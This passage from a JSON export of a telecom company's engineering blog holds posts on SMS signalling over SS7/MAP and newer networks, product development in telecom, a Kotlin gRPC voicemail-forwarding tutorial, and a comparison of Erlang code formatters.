`MO-Forward-SM` towards the *SMSC* in your\\ncurrent network. It stands for \\"Mobile Originating Forward Short\\nMessage\\" meaning it started from your (mobile-)phone.\\n\\nThe *SMSC* then asks the recipients HLR about the routing details for\\nthe *SMS*. It does so by sending another *MAP* message of type\\n`sendRoutingInfoForSM` requesting the location of the recipients *MSC*\\nor *SGSN*, or both.\\n\\nThe *SMSC* then sends another packet, this time a `MT-Forward-SM`,\\ntowards the *MSC* in the recipients network. In this case *MT* stands\\nfor Mobile Terminated, meaning it goes towards the recipients phone.\\n\\n_Dia have amazing icons:_\\n<div>\\n    <img src=\\"/img/blog/sms/forward-sm.svg\\" alt=\\"You calling your mom\\" />\\n</div>\\n\\nThe similarities in *MO* and *MT* requests are that they both contain\\na origin and destination address as well as the user data (your actual\\ntext message), and a possibly a correlation id which is basically a\\nmapping between your SIM-card id and a temporary id and was originally\\nused for making sure that the sending network paid for *SMS*s towards\\nthe receiving network.\\n\\nFor *MO* the origin address is your *MSISDN* (read telephone number),\\nand the destination is the *GT* address (Global title; a way to route\\nstuff) of the *SMSC*. For *MT* messages the origin address is the *GT*\\nof the *SMSC* and the destination address is either the recipients\\n*IMSI* (read SIM-card) or the recipients correlation id. It could also\\nbe a *LMSI* which is a 4-byte network location identifier if the\\nrecipient is also within the same network as the sender.\\n\\n## Ever wondered why there is a limit to the size of the text message you are sending?\\n\\n<div class=\\"left-right-row\\">\\n    <div class=\\"text\\">Two characters left on a GSM7 encoded SMS.</div>\\n    <img class=\\"image\\" src=\\"/img/blog/sms/160_chars.png\\" alt=\\"Characters left: 2/160\\" />\\n</div>\\n\\nIf you (god forbid) you would break the protocol and send a text\\nmessage greater than 140 bytes, which translates to 160, 152, or 70\\ncharacters depending on locale [1], then your phone would break up the\\nmessage into multiple text messages. This arbitrary size of 140 bytes\\nis not really arbitrary at all. It was chosen because it would\\nprecisely fit into a single *MTP3* *SIF* (Signalling Information\\nField) when routing label, *SCCP*, *TCAP* and *MAP* layers were taken\\ninto account.\\n\\n[1] There is something called *GSM7* bit-packing. Instead of using 1\\nbyte (8 bits) per character, *GSM7* uses 7 bits. This means that\\ninstead of 140 characters, you can get up to 160 characters per\\n*SMS*. The drawback is that you will have a smaller subset of\\ncharacters to use, only the most common is supported. If you include\\nany non-*GSM7* characters in your *SMS* then the *SMS* will\\nautomatically be converted to use either *USC-2* or *GSM7* with a\\ndifferent charset instead. *USC-2* uses 2 bytes, or 16 bits, instead\\nof *GSM7*s 7 bits. That leaves you with 70 characters per\\n*SMS*. *USC-2* is similar for the basic multilingual plane (*BMP*) to\\n*UTF-16*. In fact *UTF-16* is an extension of *UCS-2*. The main\\ndifference is that *USC-2* is fixed width and does not allow for the\\nextended characters in the private use area of *BMP*. *UTF-16* is\\nvariable width of one or two 16-bits code points, and does allow the\\nextended characters. For extended characters to work (for instance\\n\\"praying/folded hands\\" &#x1F64F;), phones might try to fake *UTF-16*\\nby using two *USC-2* characters. New phones can handle this fine, but\\nolder phones might receive two question marks as they cannot decode it\\nproperly.\\n\\nIf *GSM7* have a modified charset (i.e. not the default *BMP*) then\\nthere will be a header in front that specifies that. That header will\\ntake up 7 bytes after packing (in other words 8 characters), making\\nthe maximum length of the *SMS* 152 characters.\\n\\n<div class=\\"left-right-row\\">\\n    <img class=\\"image\\" src=\\"/img/blog/sms/67_chars.png\\" alt=\\"Characters left: 45/67 (3)\\" />\\n    <div class=\\"text\\">\\n        Using emojis will convert the encoding to USC-2. Note the missing 3\\n        characters and that there are multiple SMSes. When multiple messages\\n        are sent, the phone needs some way of telling how to reassemble the\\n        messages. The headers take up 6 bytes per message for this purpose.\\n    </div>\\n</div>\\n\\nHowever when *MAP* v2 started to use *TCAP* dialogues there was more\\ninformation to put into the packet and 140 bytes might not be left for\\nthe *SMS*. The *SMSC* would then need to break up the message into\\nchunks, and start the transaction an empty *TCAP* `Begin` message and\\nset a flag in the *MT* request called `moreMessagesToSend`. It would\\nthen send the actual text inside `Continue` messages. In the end\\nthe `End` (_hehe_) message is transmitted as a response and the\\ntransaction is finished.\\n\\nThe response back to a *MO* request is, as previous stated, an\\nacknowledgement if the *SMS* have been successfully submitted to the\\n*SMSC* or not (again either `returnResult` or `returnError`). For *MT*\\nrequests the acknowledgement is if the *SMS* is successfully delivered\\nor not.\\n\\nIf the *MT* request is not successful, the *SMSC* could ask the *HLR*\\n(the Home Location Registry is basically a database containing user\\nsubscriptions and knowledge of which nodes the mobile talked to\\nlatest) to be notified when the user comes back online. A bunch of\\nother *MAP* messages are then involved, such as\\n- `reportSMDeliveryStatus`,\\n- `informServiceCentre`,\\n- `alterServiceCentre`, and\\n- `readyForSM`.\\n\\n_At least this is main idea I think..._\\n\\n# Differences in MAP versions for SMS\\n\\nThere are three *MAP* versions defined for *SMS*. The latest version\\n(v4) is not used in the context of *SMS*.\\n\\nIn version 1, the dialogue portion was not invented and all chunks are\\nsent in new *TCAP* dialogues. The size of the user data could then\\nbe 140 bytes.\\n\\nIn version 1 and version 2 there is no difference between *MT* and\\n*MO*. Everything is sent as another type of message `Forward-SM`,\\nwhich does not include any privacy correlation ids, and there are no\\nfancy responses with delivery status. There is still an\\nacknowledgement, but is in a form of an empty message.\\n\\nOnly way to see difference between an *MO* and a *MT* in version 1 is\\nto look at the addresses and see if they are either coming from an\\n*SMSC* or going to an *SMSC*.\\n\\nThe `moreMessagesToSend` flag was implemented in version 2, so it exist\\nonly for version 2 and version 3.\\n\\nOk, to recap, what do we have now\\n\\n- `Begin`, `Continue`, `End`, `Abort` messages.\\n- Dialogue handshake in the first request/response messages sent.\\n- `MT-Forward-SM`, `MO-Forward-SM`, `Forward-SM`\\n- Involved parties: Mobile phones, *MSC* and *SMSC*\\n\\n_Wait we are missing something. I\'ve only covered 2G,3G.._\\n\\n# What about 4G/LTE and beyond (5G)?\\n\\n_Ouch._\\n\\n*LTE* networks does not use any of the *M3UA*, *SCCP*, *TCAP*, *MAP*\\nprotocols. In *LTE* networks the main message type is *Diameter* which\\ndoesn\'t contain fragmentation and can contain larger\\nmessages. Everything is sent in one request and every request is\\nanswered with a response. *Diameter* could use either *TCP* or *SCTP* as\\ntransport layer.\\n\\nTo make *SMSes* work on *LTE* networks a new interface *SGs* was\\ninvented which translates *SS7* messages to *Diameter* messages.  This\\ninterface is in most cases used by the *MSC* to translate the messages\\nto *Diameter* and forward it to the *MME* (Mobility Management Entity,\\nsimilar to *SGSN* but in the *LTE* network). The *MME* then forwards\\nit to the *UE* (user equipment, same as mobile subscriber or *MS* in\\n*GSM*/*GPRS* networks).\\n\\nThere is also the *SM-over-IP* that does not use *Diameter*. Instead\\nit uses the *SIP*-protocol (Session Initiation Protocol) to transfer\\nmessages over *IP* and *TCP* or *UDP* to the *IMS* (IP Multimedia\\nSubsystem). *SIP* is also used to enable VoLTE (Voice over *LTE*).\\n\\nFor 5G the *SMSC* is called *SMSF*; The Centre becomes a Function. The\\nsignalling will be based on *HTTP2*/*JSON* ontop of *TCP*. The *SMSF*\\nwill still need to support both *MAP* and *Diameter*.\\n\\n\\nRelevant [xkcd](https://xkcd.com):\\n<div class=\\"left-right-row\\">\\n    <table class=\\"text\\">\\n        <tr>\\n            <td>Generation</td>\\n            <td>2G/3G</td>\\n            <td>4G</td>\\n            <td>5G</td>\\n        </tr>\\n        <tr>\\n            <td>Radio technology</td>\\n            <td>GSM/GPRS</td>\\n            <td>LTE</td>\\n            <td>NR</td>\\n        </tr>\\n        <tr>\\n            <td>Protocol group</td>\\n            <td>SS7</td>\\n            <td>Diameter</td>\\n            <td>HTTP2/JSON</td>\\n        </tr>\\n        <tr>\\n            <td></td>\\n            <td>Node</td>\\n            <td>Agent</td>\\n            <td>Function</td>\\n        </tr>\\n        <tr>\\n            <td>Session management</td>\\n            <td>SGSN</td>\\n            <td>MME</td>\\n            <td>AMF</td>\\n        </tr>\\n        <tr>\\n            <td>SM management</td>\\n            <td>SMSC</td>\\n            <td>SMSC</td>\\n            <td>SMSF</td>\\n        </tr>\\n        <tr>\\n            <td>User management</td>\\n            <td>HLR</td>\\n            <td>HSS</td>\\n            <td>UDM</td>\\n        </tr>\\n        <tr>\\n            <td>Device</td>\\n            <td>MS</td>\\n            <td>UE</td>\\n            <td>UE</td>\\n        </tr>\\n    </table>\\n    <a class=\\"image\\" href=\\"https://xkcd.com/2365/\\"><img src=\\"https://imgs.xkcd.com/comics/messaging_systems.png\\" /></a>\\n</div>\\n\\n# Headache\\n\\nHopefully you did not get a (too severe) headache by reading this\\npost.\\n\\nI\'ve spared you with **a lot** of details on the lower level of\\nprotocols. There are loads of implementation details that must match\\nthe specifications, otherwise you will get all kinds of aborts and\\npossibly even dropped traffic.\\nFor instance we learned that we accidentally sent dialogue portions in\\nmore than the first response back, which seemed to work at first\\nglance; at closer inspection we found out that some messages were\\ndropped because the length of the packet became larger in size than an\\nallowed value. We could still send them, but the other side was not\\nable to receive them.\\n\\nRemember: Telco is old and complex. However, it should still function\\nwith different setups and on different hardware, vendors and with\\nenvironment.\\n\\nFun-fact: Sometimes a boolean value is not just encoded as a 1\\nor 0. To save bandwith telco decided that you could also just define\\nit as a `NULL OPTIONAL` meaning that if it is defined (but lacks a\\nvalue), then it is considered true.  if it is not defined then it is\\nconsidered false. This is the case for the `moreMessagesToSend` flag.\\n\\nHope you enjoy the reading as much as I enjoy digging into these\\nprotocols!\\n\\nSpecial thanks to *Stein Eldar* and *Tobias* for giving me feedback\\nand answering all my stupid questions on this subject, and *Atanas*\\nfor making me realize there are yet other protocols to carry *SMS*.\\nAlso *Bung* for this amazing addition:\\n\\n#### Addition from *Bung*\\n\\n\\"I\u2019ve spared you with a lot of details on the lower level of\\nprotocols\\" needs a lot of emphasis.\\n\\nSome funny extra complexities that just came into my mind while\\nreading:\\n\\nThe actual *SMS* text goes into a field called \\"user data\\". There is a\\nfield called \\"user data length\\". When the message is *GSM7* encoded, the\\n\\"user data length\\" is the number of characters in the text message,\\notherwise it\'s the number of bytes in the user data.\\n\\nNormally the user data only contains the (encoded) text of the\\nmessage, but there is a field called \\"user data header\\" which\\nindicates that there is a length prefixed TLV header in the \\"user\\ndata\\". If the message is *GSM7* encoded, then the \\"user data lenght\\"\\nfield needs to be filled as if the \\"user data header\\" was really *GSM7*\\nencoded, which it isn\'t.\\n\\n*GSM7* is really a variably septet encoding, one character can consist\\nof either 7 or 14 bits similar to how a *UTF-8* code point can be 8,\\n16, 24, or 32 bits. Unlike *UTF-8* however, there are not multiple\\nbyte ranges corresponding to the different locales (called code pages\\nin Unicode) but a single 7 bit shift character that says that\\nfollowing 7 bits should be interpreted as a character from a\\ntranslation table which is communicated out of band.\\n\\nSo all that is only the complexities of a single field (the user data)\\nfor a single encoding (*GSM7*).\\n\\nThen the real kicker: The protocol for *SMS* is really called *SM-TP*\\n(Short Message Transfer Protocol). *SM-TP* is the same for 2G/3G (on top\\nof *MAP*), 4G (on top of *SIP*), 5G (on top of *HTTP*). So the very\\nsame stupid \\"length prefixed TLV encoded headers concatenated with\\nencoded text with length either in characters or in bytes depending on\\nencoding and actual meaning of the encoding communicated out of band\\nbut only sometimes\\" field exists no matter if your talking over old\\nlegacy *MAP* or the modern *HTTP/XML* based 5G."},{"id":"a-new-hope-for-products-in-telecom","metadata":{"permalink":"/jp/blog/a-new-hope-for-products-in-telecom","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-08-28-a-new-hope-for-products-in-telecom.md","source":"@site/../blog/2020-08-28-a-new-hope-for-products-in-telecom.md","title":"A new hope for products in telecom","description":"This blog post will cover technology driven products that rely on telecom infrastructure, and not price plans, bundles, or marketing gimmicks.

Anyone who has created a product and brought it to market more than once will tell you that it is hard.\\n\\n\x3c!--truncate--\x3e\\n\\nThe prerequisites for a great product is that:\\n1. It is valuable to the user and customer\\n2. It is easy enough to use so that the user can actually realise the value\\n3. It is feasible to build given the restraints you have on technology, legal, etc.\\n4. And on top of that it needs to make sense for your business\\n\\nEven if you succeed at all of this, you still have to market, sell and support it. I don\u2019t know anyone - nor have I ever heard about any company - that is able to get this right every time.\\n\\n## Remember that one?\\nEven Apple (with Steve Jobs still at the helm) had their flops. Remember \u201ciTunes Ping\u201d? No? Exactly.\\n\\nMaybe you\u2019re more into social products, so you bought \u201cFacebook Home\u201d? No I\u2019m not talking about your Facebook wall or anything you see on a screen, but an actual screen produced by Facebook that you place in your home as you would a framed photo.\\n\\nWell, those products were bold bets. A tech giant launching a smartphone wouldn\u2019t be that risky, would it? Pull out your Amazon Fire Phone and Google it! Ah.. that\'s right! That one got discontinued just 13 months after launch.\\n\\n## Oh the pain!\\nIt\u2019s never fun to see a product fail. When it happens, not only do the customers miss out on something potentially great, but it can end in billion dollar write offs and laying off thousands of employees.\\n\\nOperators are often hit hard by these failures, but companies like Apple, Facebook, Amazon and many others can have product flops regularly and still grow and become even more successful. **Why is that?**\\n\\n\\n## Learning from failure\\nIt\u2019s easy to make fun of big companies that launch products that flop, but we really shouldn\u2019t. Products that flop aren\u2019t a symptom of something that\u2019s wrong. Like Edison put it \u201cI have not failed. I\'ve just found 10,000 ways that won\'t work.\u201d\\n\\nCompanies like Apple, Facebook and Amazon have figured out how they can continue to find 10,000 ways that won\u2019t work so that they can create that one light bulb every now and then - and by doing so totally dominate their market.\\n\\nThey do this by empowering teams to\\n1. Assess new opportunities\\n2. Discover new products\\n3. Build quickly\\n4. Test and learn early\\n\\nThis is how 10,000 small bets are made.\\n\\n## Failing to learn\\nBig traditional companies used to pour tens of millions of dollars into 1 big bet with a few years apart. This is the opposite of Edison\u2019s approach. They never say it out loud but their quote could have been \u201cI have failed, and I\u2019m still clueless whether the other 9,999 ways could have worked\u201d.\\n\\nThese days though, most big traditional companies have moved away from the \u201c1 big bet approach\u201d and created \u201cdigital departments\u201d.\\n\\nThey hire people who have had success in companies that make many small bets, and they give them the freedom to organize themselves so that they can use the same methods. Some time goes by and there are few - or no - small bets placed.\\n\\nOften the teams in these digital departments are empowered to:\\n1. Assess new opportunities\\n2. Discover new products\\n\\nBut the technology fundamentals are not in place yet, so they are not able to:\\n3. Build quickly\\n\\nWhich makes it impossible to:\\n4. Test and learn early\\n\\nThis is especially true for companies with systems that rely on telecom operators. A company that wants access to, or change part of, a solution that has to do with telecommunication has to contact their operators, then the operator typically has to contact their vendor, then the vendor typically creates a change request ticket in their system, and then finally they get back with a fix.\\n\\nAdding that long wait to what should have been \u201cbuilt quickly\u201d is exactly how they go from many small bets to 1 big bet.\\n\\n## Giving up\\nThe end result, be it from the 1 big bet approach or a failed digital department, is that the big company decides to \u201cget back to basics\u201d, \u201cstick with what they know\u201d, and \u201cstrengthen the core business\u201d - meaning that they have entirely given up trying to create new products that people love.\\n\\nThe customers miss out on great new products, employees leave, and the business suffers.\\n\\n## A new hope\\nOur company got started because of this pain. Getting access to a mobile core network to create even small products is hard.\\n\\nIf you are lucky enough to actually get access, what you will see is a closed, uniquely configured core network built on top of nodes from external vendors. Add to the mix that you need people who actually know how to build anything on top of old telecom protocols and you have a perfect storm. If you have all of this and somehow are able to build a successful product, guess what? It doesn\u2019t scale to any other operator because they also have their own uniquely configured core network. And the privilege of getting access is reserved for employees and an exclusive list of vendors. If you are an independent product company who wants to build something cool you can forget about it!\\n\\nThis is why we built a mobile core network from scratch on top of AWS. Long story short this means that every operator using our core can use any product that is built with the [wgtwo developer portal](https://developer.wgtwo.com/).\\n\\nWe believe that subscribers will start to expect that they can add a range of valuable products to their subscription. This means going from a world where everyone gets the same standardized service from their operator - to a world where subscribers are treated as individuals who are free to activate the products that they want.\\n\\nThe way we do this is by enabling 3rd party developers (you!) to create products, and matching these products with operators so that the products are brought to the market for subscribers to enjoy.\\n\\nIn short, with the wgtwo developer portal, it is possible to build quickly, so you can test and learn early, making it possible to reduce the size of your bets, and increasing the chance of building great products that people love!\\n\\n## Try it out and join us\\nWe hope to get your feedback so that we can keep our bets small, and keep learning!\\n\\nWant to read about the first product we created, and how you can do the same using the developer portal?

In this article we will show how we built VoiceBox, a Voicemail forwarding application.\\n\\n\x3c!--truncate--\x3e\\n\\n## The product\\n\\nOne of the most common complaints people have with their Voicemail service in Europe is that you have to call in to your Voicemail to listen to your messages. In order to play the message, you have to navigate through a slow voice menu using your dialpad. We believed this would be easy to improve.\\n\\nOur product idea was simple. When Alice leaves a voicemail message for Bob, Bob receives this message either as an audio file or as a speech-to-text transcript.\\n\\n\\n![VoiceBox splash screen](/img/blog/building-software-for-a-telecom-core-network/voicebox-splash.png)\\n![VoiceBox home screen](/img/blog/building-software-for-a-telecom-core-network/voicebox-home.png)\\n![Android messaging app](/img/blog/building-software-for-a-telecom-core-network/message-inbox.png)\\n\\n\\nThe product idea isn\u2019t what most people would call revolutionary, but almost all of the world\'s mobile operators have hermetically sealed core networks. This means it would be impossible to build this product without lawyering up and coming to some sort of agreement with one of them. The **wgtwo** core network, however, is open and provides API access to Voicemail, MMS and SMS  (among other things), which is just what we need to build our product.\\n\\n## Developing on the **wgtwo** platform\\n\\nTo create a product on the **wgtwo** platform, the first thing you have to do is create a free developer account at <a href=\\"https://developer.wgtwo.com\\" target=\\"_blank\\">https://developer.wgtwo.com</a>. Once you have signed up, you have to create an Organization and add a Product to that organization.\\n\\nYou can specify what permissions your product will require in the `Product > Scopes` tab:\\n\\n![Developer Portal Scopes Screen](/img/blog/building-software-for-a-telecom-core-network/developer-portal-scopes.png)\\n\\nIn an ideal world, VoiceBox would work like this:\\n1. The subscriber signs in and enables the desired functionality in VoiceBox.\\n2. The next time the subscriber receives a voicemail, an event is fired by **wgtwo**\u2019s core network, which VoiceBox receives.\\n3. VoiceBox triggers an SMS/MMS send using our APIs.\\n4. The subscriber receives an SMS/MMS from the sender \u201cVoiceBox\u201d.\\n\\nIn a few months time this ideal world should be reality, but at the time of writing (mid August 2020) we\u2019re missing the events API and the \u201cSend from Product\u201d API. Currently VoiceBox works like this (changes are highlighted):\\n1. The subscriber signs in and enables the desired functionality in VoiceBox.\\n2. The next time the subscriber receives a voicemail, **VoiceBox will discover it by polling**.\\n3. VoiceBox triggers an MMS send using our APIs.\\n4. The subscriber receives an **MMS from their own number**.\\n\\nIt\u2019s not perfect, but it still demonstrates the potential of the platform. None of this can happen without the subscriber\u2019s consent though, so in the next section we\u2019ll have a look at how that works.\\n\\n## Obtaining user consent\\n\\nThe app we\'re building is touching sensitive data, and we can\'t do that without asking the subscriber if it\u2019s okay. The **wgtwo** platform includes an OAuth implementation with SMS authentication, which means that we can be reasonably sure that the subscriber has consented.\\n\\nWhen a subscriber opens VoiceBox for the first time, they\u2019re met with a login page, and after completing a pin challenge they arrive at an OAuth consent screen. Here they have to accept the terms of VoiceBox, as well as all the required scopes.\\n\\nThe login is branded to look like the product (notice the pink action button), while the consent screen is branded to look like the operator (in our case this is <a href=\\"https://vimla.se\\" target=\\"_blank\\">Vimla</a>, a Swedish operator which uses our platform):\\n![ID login screen](/img/blog/building-software-for-a-telecom-core-network/msisdn-screen.png)\\n![ID pin screen](/img/blog/building-software-for-a-telecom-core-network/pin-screen.png)\\n![ID consent screen](/img/blog/building-software-for-a-telecom-core-network/consent-screen.png)\\n\\nOur platform has a standard <a href=\\"https://oauth.net/2/\\" target=\\"_blank\\">OAuth 2</a> flow. When the subscriber taps \u201cAccept\u201d, **wgtwo** redirects the subscriber to the third-party, which receives an \\"access token\\" that allows them to act on behalf of the subscriber. In this case the access token will let the third-party fetch Voicemails and send MMS from the subscriber, so it\u2019s important to keep it safe.\\nNext we\u2019ll look at using this access token to perform actions on the subscriber\'s behalf.\\n\\n## Connecting to the **wgtwo** API\\n\\nAll **wgtwo** APIs are <a href=\\"https://grpc.io/\\" target=\\"_blank\\">gRPC</a>. This can be a bit intimidating if you are used to REST APIs, but luckily we also have official Java clients distributed through Maven/JitPack. If you want to use a different language you can generate your own client using our public proto files. One of the benefits of gRPC is that you don\u2019t have to ever write your own rest adapter for the API.\\n\\nLet\u2019s have a look at how you can fetch a Voicemail file:\\n\\n```kotlin\\nfun getVoicemail(user: User, uuid: String): Voicemail? {\\n    val getVoicemailRequest = VoicemailProto.GetVoicemailRequest.newBuilder().setVoicemailId(uuid).build()\\n    val voicemail = try {\\n        blockingStub\\n                .withOAuthTokenFor(user) // this function attaches the access token (from the consent screen)\\n                .getVoicemail(getVoicemailRequest)\\n    } catch (e: StatusRuntimeException) {\\n        logger.warn(\\"Error getting voicemail $uuid; ${e.message}\\")\\n        throw e\\n    }\\n    if (voicemail.metadata) {\\n        return Voicemail(\\n            ... // we map the gRPC voicemail object to a VoiceBox specific object\\n        )\\n    } else {\\n        logger.warn(\\"No voicemail metadata for $uuid\\")\\n        return null\\n    }\\n}\\n```\\n\\nWe use the official **wgtwo** API client to fetch a voicemail based on the UUID of the voicemail, which we polled for earlier (code not shown).\\n\\nUnlike with REST APIs, we don\'t have to think about writing client code and handling HTTP responses, this is taken care of by the gRPC client library.\\n\\nOnce we have the voicemail, we send it to the subscriber using their own number as the sender:\\n\\n```kotlin\\nfun sendMms(user: User, phone: Msisdn, audio: ByteString) = try {\\n    val request = MmsProto.SendMessageFromSubscriberRequest\\n            .newBuilder()\\n            .addMessageContent(\\n                MmsProto.MessageContent.newBuilder().setAudio(\\n                    MmsProto.AudioContent.newBuilder().setWav(audio)\\n                )\\n            )\\n            .setToE164(phone.toPhoneNumberProto()) // the receiver is the same as the sender\\n            .setFromSubscriber(phone.toPhoneNumberProto()) // the sender is the same as the receiver\\n            .build()\\n    val response = blockingStub\\n            .withOAuthTokenFor(user) // this function attaches the access token (from the consent screen)\\n            .sendMessageFromSubscriber(request)\\n    if (response.status == MmsProto.SendResponse.SendStatus.SEND_OK) {\\n        true\\n    } else {\\n        logger.warn(\\"Unable to send MMS to ${phone.e164}: ${response.description} (${response.status.name})\\")\\n        false\\n    }\\n} catch (e: Exception) {\\n    logger.warn(\\"Unable to send MMS to ${phone.e164}: ${e.message}\\")\\n    false\\n}\\n```\\n\\nThis is also pretty straightforward, except for the part where the sender is also the receiver. In the future this will be a bit less confusing, since we\u2019ll be sending the MMS from the product (\u201cVoiceBox\u201d) instead of the subscriber itself.\\n\\n## Conclusion\\n\\nAs you can see, we\u2019re still in the early stages of our developer platform. In the coming year, we will be adding a lot more APIs, as well as building an app-store where subscribers can browse products that they want to add to their subscription. We believe opening up the core network in this way will allow third-party developers to build incredible apps that will lead to much happier subscribers, which will in turn lead to subscriber growth for operators on our platform.\\n\\nAt the time of writing, all apps on the platform have to be free, but we are working on a monetization model similar to that of the Apple and Google app-stores. Our main priority is to come up with a model that is fair to both third-party developers and operators.\\n\\nIf you\u2019re interested in our platform, please head on over to <a href=\\"https://developer.wgtwo.com\\" target=\\"_blank\\">https://developer.wgtwo.com</a> and create an account.

There\\nare two main alternatives, but sadly both have problems.  I\'ve also\\nbriefly looked at an Erlang linter.\\n\\n\x3c!--truncate--\x3e\\n\\n# Background\\n\\nIn **wgtwo** we use a bunch of different programming\\nlanguages, and we all have different experiences and are used to\\ndifferent languages and environments. We are pretty autonomous and we\\nare expected to jump in and out in different services to fix bugs and\\nadd features.\\n\\nWe like when the code is uniform, because it makes it easier to focus\\non the business logic. That is why we want to use tools to make sure\\nour code is consistent no matter who is the author, or which IDE is\\nused, or in which part of the system the code resides.\\n\\nAbout half a year ago there was a discussion about code style within\\n**wgtwo** that resulted in formatting tools being applied for\\nKotlin, Bazel, Go and Java. It also resulted in an internal wiki page\\ncontaining guidelines about code style.\\n\\nThat document highlights some of the problems with mixing different\\ncode-styles. It should be easy for newcomers to maintain the coding\\nstyle. It should also be easy to read diffs, and the discussions about\\ncode style and formatting will be minimized because there is a\\nconcensus.\\n\\n# This is nice, I want it for Erlang\\n\\nAs some of our services are written in Erlang, I wanted to investigate\\nwhich formatters exist for Erlang, and what state they are in. I used\\nour last hack day for this purpose.\\n\\nThe requirements I had was that it should be reproducable. Calling the\\nformatter multiple times should not change the structure more than\\nonce (first time of being called). The formatter should also\\npreferably work with rebar3 (the most used Erlang build tool).  The\\ntool should not use external tooling that wouldn\'t work for all\\ndevelopers flow.\\n\\nI also wanted it to have a short execution time, at least after the\\ninitial formatting.\\n\\n# Benchmark\\n\\nI searched for formatting tools on hex.pm, github.com, duckduckgo.com,\\ngoogle.com and came up with the following arbitrary list of Erlang\\nformatters. There is probably others, but these seems to be the most\\nused.\\n\\n- rebar3_fmt\\n- steamroller\\n- otp/erl_tidy\\n- tsloughter/erl_tidy\\n- rebar3_format\\n- eryngii\\n\\n## [rebar3_fmt](https://github.com/fenollp/erlang-formatter)\\n\\nOne big problem with this is that it uses Emacs `erlang-mode` for\\nformatting. Sure, I am an Emacs user and the `erlang-mode` and its\\nformatting is maintained and supperted by OTP, but my non-Emacs\\ncoworkers would not be happy if they need to install Emacs every time\\nthey want to format the code.\\n\\n## [steamroller](https://github.com/old-reliable/steamroller/)\\n\\nThough it was easy to setup (just add it to dependencies in your Rebar\\nconfig and run `rebar3 steamroll`), my first impression of the\\nexecution was that it was really slow. Even when running subsequent\\ncalls on my Dell XPS 13 P82G it took around 3.5 minutes to format.\\n\\nThe plugin had some support for increasing the number of workers from\\nthe default `--J=1`, but that did not seem to help with the execution\\ntime.\\n\\nThe default steamroller formatting options specify 2 spaces instead of\\nthe `erlang-mode` 4 spaces standard that is used in our code base.\\n\\nHere is a sample of a complex record structure\\n\\n```diff\\n-                   components =\\n-                       [{invoke,\\n-                         #\'Invoke\'{\\n-                            invokeID = 1,linkedID = asn1_NOVALUE,\\n-                            operationCode = updateLocation,\\n-                            parameter =\\n-                                #\'UpdateLocationArg\'{\\n-                                   imsi = IMSI,\\n-                                   \'msc-Number\' = CallingGTBCD,\\n-                                   \'vlr-Number\' = CallingGTBCD}}}]},\\n+   components =\\n+     [\\n+       {\\n+         invoke,\\n+         #\'Invoke\'{\\n+           invokeID = 1,\\n+           linkedID = asn1_NOVALUE,\\n+           operationCode = updateLocation,\\n+           parameter =\\n+             #\'UpdateLocationArg\'{\\n+               imsi = IMSI,\\n+               \'msc-Number\' = CallingGTBCD,\\n+               \'vlr-Number\' = CallingGTBCD\\n+             }\\n+         }\\n+       }\\n+     ]\\n+ },\\n```\\n\\nI was quite happy with the results, even though they were slow, until\\nI saw how it treated maps\\n\\n```diff\\n-      parameters =\\n-          #{called_party_addr =>\\n-                #sccp_addr{\\n-                ... },\\n-            calling_party_addr =>\\n-                #sccp_addr{\\n-                ... },\\n-            data =>\\n-                #\'Continue\'{\\n+         parameters =\\n+             #{\\n+                 called_party_addr\\n+                 =>\\n+                 #sccp_addr{\\n+                   ...\\n+                 },\\n+                 calling_party_addr\\n+                 =>\\n+                 #sccp_addr{\\n+                   ...\\n+                 },\\n+                 data\\n+                 =>\\n+                 #\'Continue\'{\\n```\\n\\nI can\'t say that I easily understand what the parameters are and which\\nthe values are with this formatting. It burns in my eyes.\\n\\n\\n## [erl_tidy](https://github.com/tsloughter/erl_tidy) and [erl_tidy](https://erlang.org/documentation/doc-11.2/lib/syntax_tools-2.5/doc/html/erl_tidy.html)\\n\\nSo I found two `erl_tidy` projects, one is included in the Erlang/OTP\\nlibraries. The other one seems just to be a rebar3 wrapper around the\\nfirst one, so I\'ll just talk about the former one.\\n\\nUnder the hood this library uses `erl_prettypr:format/2`, which prints\\nthe abstract syntax tree. This should work well, but gives weird\\nindentation problems.  For instance when it comes to records it will\\nnot add a newline before the first field, so the lines will become\\nquite long, and when the lines become close to the paper width of the\\ndocument then it inserts too many newlines.\\n\\nVisualising with this example again\\n\\n```diff\\n-        components =\\n-            [{invoke,\\n-              #\'Invoke\'{\\n-                 invokeID = 1,linkedID = asn1_NOVALUE,\\n-                 operationCode = updateLocation,\\n-                 parameter =\\n-                     #\'UpdateLocationArg\'{\\n-                        imsi = IMSI,\\n-                        \'msc-Number\' = CallingGTBCD,\\n-                        \'vlr-Number\' = CallingGTBCD}}}]},\\n+     components =\\n+\\t [{invoke,\\n+\\t   #\'Invoke\'{invokeID\\n+\\t\\t\\t =\\n+\\t\\t\\t 1,\\n+\\t\\t     linkedID\\n+\\t\\t\\t =\\n+\\t\\t\\t asn1_NOVALUE,\\n+\\t\\t     operationCode\\n+\\t\\t\\t =\\n+\\t\\t\\t updateLocation,\\n+\\t\\t     parameter\\n+\\t\\t\\t =\\n+\\t\\t\\t #\'UpdateLocationArg\'{imsi\\n+\\t\\t\\t\\t\\t\\t  =\\n+\\t\\t\\t\\t\\t\\t  IMSI,\\n+\\t\\t\\t\\t\\t      \'msc-Number\'\\n+\\t\\t\\t\\t\\t\\t  =\\n+\\t\\t\\t\\t\\t\\t  CallingGTBCD,\\n+\\t\\t\\t\\t\\t      \'vlr-Number\'\\n+\\t\\t\\t\\t\\t\\t  =\\n+\\t\\t\\t\\t\\t\\t  CallingGTBCD}}}]},\\n```\\n\\nThere are also some issues with `erl_prettypr`; it throws an exception\\nwhen there are argumented macro functions.\\n\\n```erlang\\n-define(MACRO(), object).\\nfoo(?MACRO()) ->\\n  ok.\\n```\\n\\n```erlang\\n** exception exit: no_translation\\n     in function  io:put_chars/3\\n        called as io:put_chars(<0.4843.0>,unicode,\\n                               [...])\\n     in call from erl_tidy:output/4 (erl_tidy.erl, line 431)\\n     in call from erl_tidy:write_module/3 (erl_tidy.erl, line 413)\\n     in call from erl_tidy:file_2/2 (erl_tidy.erl, line 335)\\n     in call from erl_tidy:file_1/3 (erl_tidy.erl, line 310)\\n```\\n\\n## [rebar3_format](https://github.com/AdRoll/rebar3_format)\\n\\nI had an issue when installing this plugin. It was not as easy as\\nadding `rebar3_format` to plugins in the rebar3 config. The reason I\\nhad problems with it was that the plugin depends on\\n`inaka/katana_code` which for some reason did not get pulled in\\nproperly and was missing some vital files. The issue could be resolved\\nby deleting the user rebar3 cache (`rm -rf 